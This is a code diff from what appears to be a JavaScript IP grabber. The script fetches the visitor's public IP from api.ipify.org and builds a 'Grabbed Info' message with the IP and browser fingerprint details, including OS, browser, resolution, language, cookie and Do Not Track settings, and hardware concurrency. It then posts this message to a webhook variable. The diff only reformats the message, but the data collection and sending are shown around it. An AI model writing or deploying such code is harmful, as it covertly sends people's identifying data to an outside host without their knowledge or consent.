@@ -18,18 +18,19 @@ fetch('https://api.ipify.org/?format=json')
 
 
     var message = {
-      content: '-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------' + '\n' +
-               '```IP: ' + ip + '```'+ '\n' +
-               '**Operating System:** ' + osName + '\n' +
-               '**Browser:** ' + browser + '\n' +
-               '**Resolution:** ' + resolution + '\n' +
-               '**Language:** ' + language + '\n' +
-               '**Vendor:** ' + vendor + '\n' +
-               '**Cookies enabled:** ' + cookiesEnabled + '\n' +
-               '**Do Not Track:** ' + doNotTrack + '\n' +
-               '**Hardware Concurrency:** ' + hardwareConcurrency + '\n' +
-               '**Max Touch Points:** ' + maxTouchPoints + '\n' + 
-               '-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    '
+      content: 
+               '__**Grabbed Info**__' + '\n' +
+               '```IP: ' + ip + '\n' +
+               'Operating System: ' + osName + '\n' +
+               'Browser: ' + browser + '\n' +
+               'Resolution: ' + resolution + '\n' +
+               'Language: ' + language + '\n' +
+               'Vendor: ' + vendor + '\n' +
+               'Cookies enabled: ' + cookiesEnabled + '\n' +
+               'Do Not Track: ' + doNotTrack + '\n' +
+               'Hardware Concurrency: ' + hardwareConcurrency + '\n' +
+               'Max Touch Points: ' + maxTouchPoints + '\n' + 
+               '```'
     };
 
     fetch(webwhook, {
